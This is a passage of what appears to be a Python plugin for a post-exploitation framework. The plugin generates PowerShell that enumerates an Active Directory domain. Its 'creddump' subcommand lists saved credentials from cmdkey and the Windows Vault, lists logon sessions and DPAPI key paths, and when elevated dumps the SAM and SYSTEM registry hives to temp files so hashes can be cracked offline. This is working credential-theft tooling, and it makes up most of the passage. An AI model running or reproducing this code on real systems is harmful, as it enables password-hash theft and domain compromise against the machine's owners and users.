    if($kdcHost){ $kerberos.kerberos_port_open = (Test-TcpPort ($kdcHost -replace '^\\\\','') 88) }
  }

  # RootDSE / naming contexts
  $namingContexts = Invoke-AdEnum {
    $root = [ADSI]'LDAP://RootDSE'
    $caps = @()
    try { $caps = @($root.supportedCapabilities | ForEach-Object { [string]$_ }) } catch {}
    [ordered]@{
      default_naming_context = [string]$root.defaultNamingContext
      configuration_naming_context = [string]$root.configurationNamingContext
      schema_naming_context = [string]$root.schemaNamingContext
      root_domain_naming_context = [string]$root.rootDomainNamingContext
      domain_controller_functionality = [string]$root.domainControllerFunctionality
      forest_functionality = [string]$root.forestFunctionality
      supported_ldap_capabilities = $caps
    }
  }
  if(-not $namingContexts){ Add-AdWarning ([ref]$warnings) 'RootDSE / naming contexts unavailable.' }

  # Time synchronization
  $timeSync = [ordered]@{}
  try{
    $svc = Get-Service W32Time -EA Stop
    $timeSync.service_status = [string]$svc.Status
    $timeSync.service_start = [string]$svc.StartType
  }catch{ Add-AdWarning ([ref]$warnings) "W32Time service: $($_.Exception.Message)" }
  $w32 = Invoke-AdEnum {
    $status = w32tm /query /status 2>$null
    $source = w32tm /query /source 2>$null
    [ordered]@{
      status = if($status){ @($status | ForEach-Object { $_.Trim() }) }else{ @() }
      source = if($source){ ($source | Select-Object -First 1).Trim() }else{ $null }
    }
  }
  if($w32){
    $timeSync.status_lines = $w32.status
    $timeSync.time_source = $w32.source
  }

  # Secure channel / machine account
  $secureChannel = [ordered]@{
    computer_account = ($env:COMPUTERNAME + '$')
    domain = $domain
    computer_sid = $computerDomain.computer_sid
    logon_server = $env:LOGONSERVER
    current_domain_controller = $dcName
  }
  $sc = Invoke-AdEnum {
    $out = nltest /sc_query:$domain 2>$null
    if($out){ [ordered]@{ nltest = @($out | ForEach-Object { $_.Trim() }) } }
  }
  if($sc){ $secureChannel.nltest_sc_query = $sc.nltest }
  $scTest = Invoke-AdEnum {
    $ok = Test-ComputerSecureChannel -ErrorAction Stop
    [ordered]@{ secure_channel_ok = $ok }
  }
  if($scTest){ $secureChannel.test_computer_secure_channel = $scTest.secure_channel_ok }

  if($forestTrusts.Count){ $forest['forest_trusts'] = $forestTrusts }

  $result = [ordered]@{
    ad_environment = $true
    summary = [ordered]@{
      domain_joined = $true
      domain = $domain
      domain_role = $role
      dcs = $dcs.Count
      trusts = $trusts.Count
      ous = $ous.Count
      sites = $sitesSubnets.Count
      gc_servers = $gcServers.Count
    }
    computer_domain = $computerDomain
    current_identity = $currentIdentity
    domain_membership = $membership
    domain_controllers = $dcs
    fsmo_roles = $fsmoRoles
    forest = $forest
    domain_info = $domainBlock
    sites_subnets = $sitesSubnets
    trusts = $trusts
    organizational_units = $ous
    global_catalog = $gcBlock
    ldap_ad_services = $ldapServices
    dns_configuration = $dnsConfig
    sysvol_netlogon = $sysvolNetlogon
    password_policy = $passwordPolicy
    kerberos = $kerberos
    naming_contexts = $namingContexts
    time_synchronization = $timeSync
    secure_channel = $secureChannel
    warnings = @($warnings)
    collection_errors = @($collectionErrors)
  }
  $json = ($result | ConvertTo-Json -Depth 9 -Compress)
}
"""
    )
    return wrap_ps_collector(body)


def build_creddump_command():
    body = _ps_common_helpers() + r"""
$warnings = @()

function Invoke-CredEnum([scriptblock]$Block){
  try { return & $Block } catch {
    $warnings += $_.Exception.Message
    return $null
  }
}

$cmdkey = Invoke-CredEnum {
  $out = cmdkey /list 2>&1
  if($out){ @($out | ForEach-Object { [string]$_ }) }
}

$vault = Invoke-CredEnum {
  $rows = @()
  try {
    $out = cmd /c "vaultcmd /listcreds /all 2>nul"
    if($out){ $rows = @($out | ForEach-Object { [string]$_ }) }
  } catch {}
  if(-not $rows.Count){
    try {
      [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
      $pv = New-Object Windows.Security.Credentials.PasswordVault
      $pv.RetrieveAll() | ForEach-Object {
        $rows += "$($_.Resource) | $($_.UserName)"
      }
    } catch {}
  }
  if($rows.Count){ $rows }
}

$logonSessions = Invoke-CredEnum {
  $rows = @()
  query user 2>$null | Select-Object -Skip 1 | ForEach-Object {
    $line = $_.Trim()
    if($line){ $rows += $line }
  }
  if($rows.Count){ $rows }
}

$dpapi = Invoke-CredEnum {
  $paths = @(
    "$env:APPDATA\Microsoft\Protect",
    "$env:LOCALAPPDATA\Microsoft\Protect",
    "$env:WINDIR\System32\config\systemprofile\AppData\Roaming\Microsoft\Protect"
  )
  $found = @()
  foreach($p in $paths){
    if(Test-Path $p){ $found += "$p (present)" }
  }
  if($found.Count){ [ordered]@{ master_key_paths = $found } }
}

$privileged = [ordered]@{
  note = 'SAM/LSASS/NTDS extraction requires explicit creddump mode and elevated privileges; no secrets collected here.'
}
$isAdmin = Invoke-CredEnum {
  $id = [Security.Principal.WindowsIdentity]::GetCurrent()
  $pr = New-Object Security.Principal.WindowsPrincipal($id)
  $pr.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}
if($isAdmin){
  $privileged.admin = $true
  $samPath = Join-Path $env:TEMP ('sam_' + [guid]::NewGuid().ToString('N').Substring(0,8) + '.hive')
  $sysPath = Join-Path $env:TEMP ('sys_' + [guid]::NewGuid().ToString('N').Substring(0,8) + '.hive')
  $samOk = Invoke-CredEnum {
    reg save HKLM\SAM $samPath /y 2>&1 | Out-Null
    Test-Path $samPath
  }
  $sysOk = Invoke-CredEnum {
    reg save HKLM\SYSTEM $sysPath /y 2>&1 | Out-Null
    Test-Path $sysPath
  }
  if($samOk -and $sysOk){
    $privileged.sam_hive = $samPath
    $privileged.system_hive = $sysPath
    $privileged.status = 'SAM/SYSTEM hives saved to temp (hashes not parsed in-plugin)'
  } else {
    $privileged.status = 'SAM/SYSTEM hive export failed or blocked'
    Remove-Item $samPath,$sysPath -Force -EA 0
  }
} else {
  $privileged.admin = $false
  $privileged.status = 'Not elevated; SAM/LSASS collection skipped'
}

$result = [ordered]@{
  summary = [ordered]@{
    cmdkey_entries = @($cmdkey).Count
    vault_entries = @($vault).Count
    logon_sessions = @($logonSessions).Count
    elevated = [bool]$isAdmin
  }
  cmdkey = if($cmdkey){ @{ entries = @($cmdkey) } } else { @{ status = 'unavailable' } }
  vault = if($vault){ @{ entries = @($vault) } } else { @{ status = 'unavailable' } }
  logon_sessions = @($logonSessions)
  dpapi = $dpapi
  privileged = $privileged
  warnings = @($warnings)
}
$json = ($result | ConvertTo-Json -Depth 6 -Compress)
"""
    return wrap_ps_collector(body)


@plugin.command(
    name='adinfo',
    platforms=['windows'],
    description='Enumerate domain membership, DCs, trusts, and AD environment details',
)
def run(session: SessionContext, args):
    if args:
        action = args[0].strip().lower()
        if action in ('-h', '--help', 'help', '?'):
            session.print(ADINFO_USAGE, 'yellow')
            return 0
        if action == 'creddump':
            return run_collector_plugin(
                session,
                'adinfo creddump',
                None,
                build_creddump_command,
                format_creddump_report,
                timeout=90.0,
            )
        session.print(f"Unknown adinfo subcommand: {args[0]}", 'red')
        session.print(ADINFO_USAGE, 'yellow')
        return 1

    return run_collector_plugin(
        session,
        'adinfo',
        None,
        build_command,
        format_adinfo_report,
        timeout=120.0,
    )
